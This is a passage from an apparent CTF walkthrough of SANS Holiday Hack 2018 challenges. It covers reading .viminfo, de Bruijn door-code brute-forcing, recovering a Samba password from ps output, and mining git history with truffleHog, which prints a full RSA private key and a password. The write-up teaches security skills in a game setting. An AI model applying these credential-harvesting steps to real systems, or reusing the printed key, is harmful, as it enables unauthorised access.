  Of good fortune fates had borne him.  Offered her his dexter forelimb,
Never was his future less dim!  Should he now consider gliding--
No - they shouldn't but consider taking flight in sleigh and riding
  Up above the Pole abiding?

Smile, she did, when he suggested that their future surely rested,
Up in flight above their cohort flying high like ne'er before!
  So he harnessed two young reindeer, bold and fresh and bearing no fear.
In they jumped and seated so near, off they flew - broke through the door!
Up and up climbed team and humor, Morcel being so adored,
  By his lovely NEVERMORE!

-Morcel Nougat
```

Awwh, Morcel! While the poem is great, we got work to do! We know that Tangle gave us a hint on [vim artifacts](https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/), so let's go ahead an read that.

On the website we find the following piece on the `.viminfo` file to be interesting.

> The .viminfo file, according to the  [official documentation](http://vimdoc.sourceforge.net/htmldoc/starting.html#viminfo)  is a special file used to remember information that would otherwise be lost when exiting vim. It essentially operates like a cache file in which vim persistently stores buffer information. From the documentation we can also learn exactly what is supposed to populate this file:
>
> -   The command line history
> -   The search string history
> -   The input-line history
> -   Contents of non-empty registers
> -   Marks for several files
> -   File marks, pointing to locations in files
> -   Last search/substitute pattern
> -   The buffer list
> -   Global variables

Okay awesome, so generally `.viminfo` should contain changes to the poem file if vim was used. So from here let's go back to the home directory and see what that file contains.

```console
elf@27c731a8b356:~/.secrets/her$ cd ~
elf@27c731a8b356:~$ cat .viminfo 
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
|2,0,1536606844,,"q"
:w
|2,0,1536606841,,"w"
:s/God/fates/gc
|2,0,1536606833,,"s/God/fates/gc"
:%s/studied/looking/g
|2,0,1536602549,,"%s/studied/looking/g"
:%s/sound/tenor/g
|2,0,1536600579,,"%s/sound/tenor/g"
:r .secrets/her/poem.txt
|2,0,1536600314,,"r .secrets/her/poem.txt"

# Search String History (newest to oldest):
? Elinore
|2,1,1536607217,,"Elinore"
? God
|2,1,1536606833,,"God"
? rousted
|2,1,1536605996,,"rousted"
? While
|2,1,1536604909,,"While"
? studied
|2,1,1536602549,,"studied"
? sound
|2,1,1536600579,,"sound"

# Expression History (newest to oldest):

# Input Line History (newest to oldest):

# Debug Line History (newest to oldest):

# Registers:
"1      LINE    0

|3,0,1,1,1,0,1536605034,""
""-     CHAR    0
        .
|3,1,36,0,1,0,1536606803,"."

# File marks:
'0  34  2  ~/.secrets/her/poem.txt
|4,48,34,2,1536607231,"~/.secrets/her/poem.txt"
---snip---
```

In the info file, I see an interesting substitution for Elinore. 

```
# Last Substitute Search Pattern:
~MSle0~&Elinore
```

Seem Morcel was to shy to write his crushes name! I'm guessing this is the name we need, so let's see if it's correct!

```console
elf@27c731a8b356:~$ ./runtoanswer 
Loading, please wait......



Who was the poem written about? Elinore


WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!
```

And it is!

### de Brujin Sequences

Upon successfully completing the Lethal ForensicELFication CranPI, we can talk to Tangle again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-20.png"><img src="/images/hh18-20.png"></a></p>

For this objective, we need break into the speaker unpreparedness room to see what Morcel Nougat says. The room is right next to Tangle and seem to contain a certain door pass code that we need to bypass.

<p align="center"><a href="/images/hh18-21.png"><img src="/images/hh18-21.png"></a></p>

Upon clicking the pass code, we are presented with the following image.

<p align="center"><a href="/images/hh18-22.png"><img src="/images/hh18-22.png"></a></p>

Interesting, I have no idea what this really is. We know that Tangle provide us a hint to the [de Bruijn Sequence Generator](http://www.hakank.org/comb/debruijn.cgi), so I'm guessing this pass code is just that!

Before attempting this challenge I wanted to learn what a [de Bruijn sequence](https://en.wikipedia.org/wiki/De_Bruijn_sequence) really is. After some research I learned that this sequence is what's called  [Combinatorics](https://en.wikipedia.org/wiki/Combinatorics). And is an area of mathematics primarily concerned with counting, both as a means and an end in obtaining results, and certain properties of finite structures.

For those unfamiliar with complex math and graph theory, here is an ELI5 (Explain Like I'm 5) for what the de Brujin sequence is:

> A De Brujin Graph is a directed graph representing overlaps between sequences of symbols.
> 
> Let's take that definition apart. First, a graph in this context is just a drawing of a bunch of circles with something written inside, then these circles are connected together with lines.
> 
> The graph is  _directed_, so the lines connecting the circles together have an arrow on one end. If A has an arrow pointing to B then B may or may not have an arrow pointed back at A.
> 
> The "symbols" could be most anything. If they are letters then the sequence of symbols would be words (or general keyboard smashing; De Brujin doesn't care). If the symbols are digits then the sequences are several-digit numbers. You can have anything make up your list of possible symbols, then every circle in the graph gets some unique sequence of the same length. For example, if your symbols were 'A', 'B', and 'C' and you were using sequences that were two letters long then you would have circles with "AA" "AB" "AC" "BA" "BB" "BC" "CA" "CB" and "CC" in them. Note that this is  _every_possible permutation of these 3 symbols. If you used many symbols and a long sequence length then you quickly wind up with a  _ton_  circles in your graph.
>
> Finally, we look at how to draw the lines in the graph. You start at any circle and you look at what is in that circle. Then you delete the character on the far left side of the sequence and you add any character to the right side. This will now be the name of another circle. Draw an arrow that points from the circle that you started at to the circle that has that new name. Now repeat for every possible combination.
> 
> Using our graph with 'A', 'B', and 'C' of length 2 we would find that the "AA" square should have a line that points at "AA" (i.e. back at itself), one that points at "AB", and one that points at "AC". To work through another node, the "CB" circle should be pointing at the "BA", the "BB", and the "BC" circles.
> 
> These graphs have some neat properties. For example, note that if you have "m" different symbols (we used m = 3) then every node (circle) will have m arrows pointing out and m arrows pointing in.

Understood? Good!

So, let's get back to hacking this pass code sequence. Using the website provided to us, we need to fill in 2 values, _k_ and _n_. We know that _k_ is the size of the alphabet, and that _n_ is the _length_ of that string, or in our case, the pass code.

Fro this challenge, we have 4 symbols, with a pass code length of 4. So __k = 4__ and __n = 4__. So based off of this our sequence will be `k^n = 4^4 = 256 (with the "wrap": k^n+(n-1) = 4^4+(4-1) = 259)`. 

Thus resulting in the following sequence.

```
0  
0 0 0 1  
0 0 0 2  
0 0 0 3  
0 0 1 1  
0 0 1 2  
0 0 1 3  
0 0 2 1  
0 0 2 2  
0 0 2 3  
0 0 3 1  
0 0 3 2  
0 0 3 3  
0 1  
0 1 0 2  
0 1 0 3  
0 1 1 1  
0 1 1 2  
0 1 1 3  
0 1 2 1  
0 1 2 2  
0 1 2 3  
0 1 3 1  
0 1 3 2  
0 1 3 3  
0 2  
0 2 0 3  
0 2 1 1  
0 2 1 2  
0 2 1 3  
0 2 2 1  
0 2 2 2  
0 2 2 3  
0 2 3 1  
0 2 3 2  
0 2 3 3  
0 3  
0 3 1 1  
0 3 1 2  
0 3 1 3  
0 3 2 1  
0 3 2 2  
0 3 2 3  
0 3 3 1  
0 3 3 2  
0 3 3 3  
1  
1 1 1 2  
1 1 1 3  
1 1 2 2  
1 1 2 3  
1 1 3 2  
1 1 3 3  
1 2  
1 2 1 3  
1 2 2 2  
1 2 2 3  
1 2 3 2  
1 2 3 3  
1 3  
1 3 2 2  
1 3 2 3  
1 3 3 2  
1 3 3 3  
2  
2 2 2 3  
2 2 3 3  
2 3  
2 3 3 3  
3
```

Now note that we have numbers ranging from 0  - 3. These numbers represent their shape counterpart, going left to right.

```
0 - Triangle
1 - Square 
2 - Circle
3 - Star
```

This can also be seen in the [DevTools Console](https://developers.google.com/web/tools/chrome-devtools/console/) when entering the pass code.

<p align="center"><a href="/images/hh18-23.png"><img src="/images/hh18-23.png"></a></p>

To "brute force" this pass code, we need to follow the sequence from __0__ to the end of __3__ as per the sequence list.  So for example when we go from __0__ to __0 0 0 2__ we go in the following "cyclical" order.

```
0
00
000
0001
0010
0100
1000
0002
```

This "cyclical" order of the symbols is what makes the brute force. As we rotate through the sequence we attempt multiple different variants of the pass code.

If you keep doing this up to __0 0 1 3__ then we will eventually get to the correct pass code of __0 2 3 0__.

<p align="center"><a href="/images/hh18-24.png"><img src="/images/hh18-24.png"></a></p>

Once we get the correct passcode, the door opens and we meet Morcel Nougat.

<p align="center"><a href="/images/hh18-25.png"><img src="/images/hh18-25.png"></a></p>

Talking to him we get the answer for the third objective! 

<p align="center"><a href="/images/hh18-26.png"><img src="/images/hh18-26.png"></a></p>

From here, we can navigate to the third objective in our badge and enter "__Welcome unprepared speaker!__" to complete the objective.

<p align="center"><a href="/images/hh18-27.png"><img src="/images/hh18-27.png"></a></p>

## Objective 4

### Stall Mucking Report - CranPi

From Tangle, we got left, down the stairs, and to the left down the hall past the swag booth. There we meet Wunorse Opensale.

<p align="center"><a href="/images/hh18-28.png"><img src="/images/hh18-28.png"></a></p>

Talking to Wunorse we figure out what the challenge consists of, and of course we also get a couple of hints to help in completing the CranPi challenge.

<p align="center"><a href="/images/hh18-28-1.png"><img src="/images/hh18-28-1.png"></a></p>

Upon accessing the terminal we are presented with the following output:

```console
l,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kxc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkxc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkxl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkl;,,c,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,o:,,,,,,,,,,,
kkkkkkkkkkok0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0K;,,,,,,,,,,
kkkkkkkkkkOXXd,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dXXl,,,,,,,,,,
kkkkkkkkkkOXXXk:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,,,,dXXXc,,,,,,,,,,
kkkkkkkkkkk0XXXXk:,,k:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:K:,,l0XXXO,,,,,,,,,,,
kkkkkkkkkkkk0XXXXXOkXx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,xX0xKXXXXk,,,,,,,,,,,,
kkkkkkkkkkkkkOKXXXXXXXkxddo;,,,,,,,,,,,,,,,,,,,,,,,,cddxkXXXXXXXkc,,,,,,,,,,,,,
kkkkkkkkkkkkkkkk00KXXXXXkl,,,,,,,,,,,,oKOc,,,,,,,,,,,:xXXXX0kdc;,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkKXXXKx:,,,,,,,,;dKXXXX0l,,,,,,,,cxXXXXk,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkk0XXXXX0xoc;,;dKXXXXXXXX0l;:cokKXXXXKo,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkk0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXKkl,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkOO00XXXXXXXXXXXXXXXXXXXxc:;,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkO0XNWWNNXXXXXXXXXXNNWWN0o,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkO0XWMMMMMMNXXXXXXXNWMMMMMMNKo,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkk0XXWMMMMMMMMNXXXXXXWMMMMMMMMNX0c,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkOKXXNMMMMMMMMMWXXXXXNMMMMMMMMMWXXXx,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkOXXXXNMMMMMMMMMMXXXXXNMMMMMMMMMWXXXXk,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkKXXXXNMMMMXl:dWWXXXXXNMXl:dWMMMWXXXXXd,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkk0XXXXXXNMMMo   KNXXXXXXNo   KMMMNXXXXXX;,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkKXXXXXXXNWMM0kKNXXXXXXXXN0kXMMWNXXXXXXXo,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkXXXXXXXXXXNNNNXXXX0xxKXXXXNNNNXXXXXXXXXx,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkXXXXXXXXXXXXXXXXX'    oXXXXXXXXXXXXXXXXd,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXX.    cXXXXXXXXXXXXXXXXc,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkOXXXXXXXXXXXXXXXXXdllkXXXXXXXXXXXXXXXXk,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXkl,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXOkkkl;,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkOXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXKkkkkkkko;,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXKOkkkkkkkkkkd:,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkOKXXXXXXXXXXXXXXXXXXXXXXKOkkkkkkkkkkkkkkd:,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkO0KXXXXXXXXXXXXXXK0Okkkkkkkkkkkkkkkkkkkd:,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkxc,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;

Thank you Madam or Sir for the help that you bring!
I was wondering how I might rescue my day.
Finished mucking out stalls of those pulling the sleigh,
My report is now due or my KRINGLE's in a sling!

There's a samba share here on this terminal screen.
What I normally do is to upload the file,
With our network credentials (we've shared for a while).
When I try to remember, my memory's clean!

Be it last night's nog bender or just lack of rest,
For the life of me I can't send in my report.
Could there be buried hints or some way to contort,
Gaining access - oh please now do give it your best!

-Wunorse Openslae


Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/
elf@50f57b41c06d:~$
```

So for this challenge, we need to upload the elf's `report.txt` file to the samba share at `//localhost/report-upload/`.

As always, let's see what we have to work with.

```console
elf@50f57b41c06d:~$ ls -la
total 24
drwxr-xr-x 1 elf  elf  4096 Dec 14 16:32 .
drwxr-xr-x 1 root root 4096 Dec 14 16:32 ..
-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf  3543 Dec 14 16:32 .bashrc
-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile
-rw-r--r-- 1 elf  elf   513 Jan  9 03:40 report.txt
elf@50f57b41c06d:~$ cat report.txt 
Stall mucking report

Dasher - routine
Dancer - routine
Prancer - confiscated second salt lick
Vixen - minor repair/adjustment to water system
Comet - routine
Cupid - routine
Donner - routine
Blitzen - refilled headache medicine
Thrasher - routine
Thunder - requested hay! oats! hay! oats!
Blaster - stall... took extra mucking
Blunder - caught with excessive carrot contraband again
Blogger - discussed social media policies again
Bragger - what appeared to be a prosthetic red nose
Wed Jan  9 03:40:14 UTC 2019
```

Huh... seems like Prancer and Blunder have a problem. Anyway, let's move on with the challenge.

When talking to Wunorse we got a hint on [keeping command line passwords out of PS](https://blog.rackspace.com/passwords-on-the-command-line-visible-to-ps). 

One that page, we find the following to be quite interesting.

> “For example, if you run a SQL script at the command line like this:  
> `sqlplus system/oracle@orcl @scriptname.sql`
> 
> The entire command will be visible to anyone that happens to be logged onto the server when the script is run.
>
> In Windows, `tasklist –v` will display the username/password and on Unix, the `ps` command will do the same. 

This is quite awesome actually, and something I didn't know! So, since we're on a linux system for this challenge, let's see if the [ps](http://man7.org/linux/man-pages/man1/ps.1.html) command (which reports a snapshot of the current processes) can be used to find a password.

```console
elf@50f57b41c06d:~$ ps -aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  17952  2884 pts/0    Ss   03:40   0:00 /bin/bash /sbin/init
root        11  0.0  0.0  45320  3104 pts/0    S    03:40   0:00 sudo -u manager /home/manager/sam
root        12  0.0  0.0  45320  3172 pts/0    S    03:40   0:00 sudo -E -u manager /usr/bin/pytho
root        16  0.0  0.0  45320  3080 pts/0    S    03:40   0:00 sudo -u elf /bin/bash
manager     17  0.0  0.0  33848  8212 pts/0    S    03:40   0:00 /usr/bin/python /home/manager/rep
manager     18  0.0  0.0   9500  2604 pts/0    S    03:40   0:00 /bin/bash /home/manager/samba-wra
elf         20  0.0  0.0  18204  3388 pts/0    S    03:40   0:00 /bin/bash
root        25  0.0  0.0 316664 15620 ?        Ss   03:40   0:00 /usr/sbin/smbd
root        26  0.0  0.0 308372  5712 ?        S    03:40   0:00 /usr/sbin/smbd
root        27  0.0  0.0 308364  4448 ?        S    03:40   0:00 /usr/sbin/smbd
root        29  0.0  0.0 316664  5868 ?        S    03:40   0:00 /usr/sbin/smbd
manager     40  0.0  0.0   4196   652 pts/0    S    03:48   0:00 sleep 60
elf         41  0.0  0.0  36636  2936 pts/0    R+   03:48   0:00 ps -aux
```

Well it seems that we got a username, and see something about samba, but unfortunately the text for the command is cut off!

Not to fear though! Using some linux foo and the [awk](https://linux.die.net/man/1/awk) command we can cut out just the commands, like so.

```console
elf@50f57b41c06d:~$ ps ax | awk -v p='COMMAND' 'NR==1 {n=index($0, p); next} {print substr($0, n)}'
/bin/bash /sbin/init
sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
sudo -E -u manager /usr/bin/python /home/manager/report-check.py
sudo -u elf /bin/bash
/usr/bin/python /home/manager/report-check.py
/bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
/bin/bash
/usr/sbin/smbd
/usr/sbin/smbd
/usr/sbin/smbd
/usr/sbin/smbd
sleep 60
ps ax
awk -v p=COMMAND NR==1 {n=index($0, p); next} {print substr($0, n)}
```

Awesome, so it seems we can upload the file using the `report-upload` username and the password of `directreindeerflatterystable`. Let's give it a shot!

We can use the `-c` options with [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) to carry out a command and upload our report to the `report-upload` share.

```console
elf@240e1a66e372:~$ smbclient //localhost/report-upload -c 'put "report.txt"' -U report-upload
WARNING: The "syslog" option is deprecated
Enter report-upload's password: 
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
elf@240e1a66e372:~$ 
                                                                               
                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          
                                                                               



You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
```

And that's a wrap! 

### Data Repo Analysis

Upon successfully completing the Stall Mucking Report CranPI, we can talk to Wunorse again for more hints that will allow us to complete the next objective.

<p align="center"><a href="/images/hh18-29.png"><img src="/images/hh18-29.png"></a></p>

For this objective, we need retrieve the encrypted ZIP file, and find the password for it from the [North Pole Git repository](https://git.kringlecastle.com/Upatree/santas_castle_automation)

Upon accessing the git repository, we are presented with the following screen.

<p align="center"><a href="/images/hh18-30.png"><img src="/images/hh18-30.png"></a></p>

Awesome! So this seems to be a git repository for Santa's autonomous delivery drones! What a... safe, idea? Not sure how I feel about this, guess this is the future. I also don't know how I'm going to explain to my future kids that Santa used to deliver these presents in a sleigh....

Right! Sorry, anyway, back to the challenge! If we keep looking through the `README` we come across a message from Shinny.

<p align="center"><a href="/images/hh18-31.png"><img src="/images/hh18-31.png"></a></p>

Hmm... alright so it seems that Shinny pushed her credentials via git, but then somehow removed them. She also mentions something about the repositories "shroud", so I would assume that would be the git log.

Only one way to found out! 

For this challenge we were also provided a hint on using [truffleHog]([https://github.com/dxa4481/truffleHog](https://github.com/dxa4481/truffleHog)) which is a python tool that searches through git repositories for secrets, digging deep into commit history and branches. This tools is initially effective at finding secrets accidentally committed, just what we need!

Let's start by first installing the tool.

```console
root@kali:~/HH# pip install truffleHog
```

Once the tool is successful installed, let's go ahead and clone the git repository.

```console
root@kali:~/HH# git clone [https://git.kringlecastle.com/Upatree/santas_castle_automation.git](https://git.kringlecastle.com/Upatree/santas_castle_automation.git)
Cloning into 'santas_castle_automation'...
remote: Enumerating objects: 949, done.
remote: Counting objects: 100% (949/949), done.
remote: Compressing objects: 100% (545/545), done.
remote: Total 949 (delta 258), reused 879 (delta 205)
Receiving objects: 100% (949/949), 4.27 MiB | 270.00 KiB/s, done.
Resolving deltas: 100% (258/258), done.
```

Once we clone the repository, we can then use our tool with the `--entropy=True` flag set to capture mode data.

```console
root@kali:~# trufflehog --entropy=True file:///root/HH/santas_castle_automation/~~~~~~~~~~~~~~~~~~~~~
Reason: High Entropy
Date: 2018-12-11 02:29:03
Hash: 6e754d3b0746a8e980512d010fc253cbb7c23f52
Filepath: schematics/files/dot/ssh/key.rsa
Branch: origin/master
Commit: cleaning files
@@ -0,0 +1,27 @@
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAsvB0ov2pCU0zr9olk0P2CZw9ZDgQVcsM9t37tK+ddah7pe3z
+11wLQG9EWSCLKfFdQgaMlo+x6wRSjpzODqIAjLfvDwr3TFlCv93oYoTzwmwdHIWB
+60FxGSryDK+CPRuCcrYfQDrbpAyB/i8JrNNQHwrJsh0aF66irexFAKNIwH4a3Bzv
+tX+5Oh7zR5zwBXFT08ijP2wEfz6DPkoK0P0zHm+vmGajZ3lOZQ6wufbRBaAJYp5Y
+XnAIMwYGI1y6hiIGTSPpa4LT6j325z6jGfUqCLox2uFPByPo+HGKMvFd+MV/OE+G
+4iM6lp1HZmcZcd3ZPxEqw1VrBp/CRv0U676K9QIDAQABAoIBAF56fWsNubGSlKbV
+7J8L9B1w5C1FOMLDui2iWWM2klHsSpT6xZPBIqO72/+fIjtcGFxjLtnUNyGan6hy
+/I1XVij2eP+dT6N9QbQii69w+W9/PAOyLj2zyO578V9nT8HKA59jr65vJUdB32UB
+Gv+odxZc0M/9c6hrabOhG3HRxPj0+k29qPm4+U4bFoufaNT1a1p4Zq1ZQy0KAWuE
+WsoeXVBu5e+J2lGcTEWSNScGKkjkHtHIvQmtPOeoa6dyDjANN8nOIrCnHwY5GxKk
+eeGpffyQ3EnM7uGW09IHN6Kt3M7RVGzQPAzTt7L+Ez+dW27+nnKcSxiW6N15jW7s
+w+QmFCUCgYEA23OeCUa58xnYs/RVpfqBkRlMs/9nKJ2+55fWa1eTOl4sXTDOe3EV
+ptR48se1ynVSww3zFl8ksh1GCD3ecPawHG3WAb4MU66UDtLYYPcr5IrX6tZfsiPi
+MaXmiUjcXSZZc/+smz6Bg1C5lGA3/+mI/Rgern2LF2mEZYolOMdDyp8CgYEA0L2V
+K7qVEkSNYjelgmZF3bP/ahHJvk7ZlsVbCVTnFj3j6XU7Fng86x5lxEUiO2a2q/Id
+B1daYUHL5Kef0ZcdKTNirOwxkwHUu4l27DCgIBBVGyJMFtX4wIMW9xrp9PUl78mi
+5FJolyq9XhDELjkD1OKp6UdSXISurQqn8XFLlesCgYEArTjXDzVvxC+ruWhtTuWs
+7m7M9+vrbskNjttwmix3f4Qkeq7y3ceGsrhWfDUeDyCK4oKZVhhl695lkE3dzsc6
+fkZIvflY25kbL5RIzklssSrTgoAS65edjVkJ32XO5AxIYeL4SVaOfqvywOcubOfX
+hQhL96oLZ8CXjFr+RJIttbsCgYAc9kDtOU0XpMVNHFVte000TpYgnGk2a3BLOATC
+jbImZt3pdWeGXZZuNOB/0+vE/CJaRxR6AUe7+MoWZp+JEANuxP9q6LaUJAvlHVSP
+vstox3tXcXHHNVb3NvkHvgc6Ao2J8JsWPMzgNIDjvUXK+AQtFGnowQmPZqVpwvG8
+UTDgkwKBgEZ/OIhjkXHltomC8HMjFxSZ7/YF94aTEdgo3GNb44VlLgz4SJD4ztcz
+d2M+rIaGtrXPylHdoHrGHyDMhc8Lnh8fNNKbMFLL8Zd8sKRt92bDHR9/JO+k/PKr
+ZWwI1hlAs8o9z81481/mKgA417dFRDTT1LgRdaKiiL/H/trWepgl
+-----END RSA PRIVATE KEY-----
\ No newline at end of file

~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~
Reason: High Entropy
Date: 2018-12-11 02:25:45
Hash: 7f46bd5f88d0d5ac9f68ef50bebb7c52cfa67442
Filepath: schematics/for_elf_eyes_only.md
Branch: origin/master
Commit: removing file
@@ -0,0 +1,15 @@
+Our Lead InfoSec Engineer Bushy Evergreen has been noticing an increase of brute force attacks in our logs. Furthermore, Albaster discovered and published a vulnerability with our password length at the last Hacker Conference.
+
+Bushy directed our elves to change the password used to lock down our sensitive files to something stronger. Good thing he caught it before those dastardly villians did!
+
+ 
+Hopefully this is the last time we have to change our password again until next Christmas. 
+
+
+
+
+Password = 'Yippee-ki-yay'
+
+
+Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
+

---snip---

@@ -1,32 +0,0 @@
-{
-  "project_page": "https://github.com/thias/puppet-sysctl",
-  "version": "0.3.0",
-  "license": "Apache 2.0",
-  "description": "Manage sysctl variable values.",
-  "dependencies": [
-
-  ],
-  "types": [
-
-  ],
-  "name": "thias-sysctl",
-  "author": "Matthias Saou",
-  "summary": "Sysctl module",
-  "source": "git://github.com/thias/puppet-sysctl",
-  "checksums": {
-    "tests/init.pp": "e70e5327b9840b44699bb7fae71d47cd",
-    "spec/spec_helper.rb": "3ea886dd135e120afa31e0aab12e85b0",
-    "ChangeLog": "ed8052eb5cb46b92eaa03b882c11779e",
